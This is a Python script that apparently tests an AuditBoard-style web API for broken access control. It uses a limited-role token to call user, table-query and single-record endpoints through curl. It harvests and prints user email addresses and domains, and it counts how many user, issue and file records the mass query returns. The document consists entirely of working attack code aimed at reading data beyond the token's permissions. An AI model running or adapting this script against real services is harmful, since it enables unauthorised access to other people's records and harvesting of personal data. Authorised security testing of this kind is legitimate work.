import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
LT=open('/tmp/tok315').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-AuditBoard-Source: SchemaTable Rows']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== LIMITED role-11 token: GET /users ===")
c,b=req('GET','/api/v1/users',tok=LT)
print("  HTTP",c,"len",len(b))
try:
    d=json.loads(b); us=d.get('users') or []
    print("  users returned:",len(us))
    em=[u.get('email') for u in us if u.get('email')]
    print("  emails:",len(em))
    print("  sample:",em[:6])
    print("  domains:",sorted(set(e.split('@')[-1] for e in em))[:12])
except Exception as e: print("  ",b[:300])
print("\n=== LIMITED token: table/query mass read ===")
for ent in ['user','issue','file']:
    c,b=req('POST',f'/api/v1/table/query?entities={ent}',
            {"ab:query":{"entities":[ent],"filter":{},"include":[ent]}},tok=LT)
    n=0
    try: n=len(json.loads(b).get('included') or [])
    except: pass
    print(f"  {ent:8} -> {c}  included={n}")
print("\n=== LIMITED token: single-record reads ===")
for p in ['/api/v1/users/1','/api/v1/users/230','/api/v1/issues/121','/api/v1/files/2691']:
    c,b=req('GET',p,tok=LT)
    print(f"  {p:24} -> {c}")
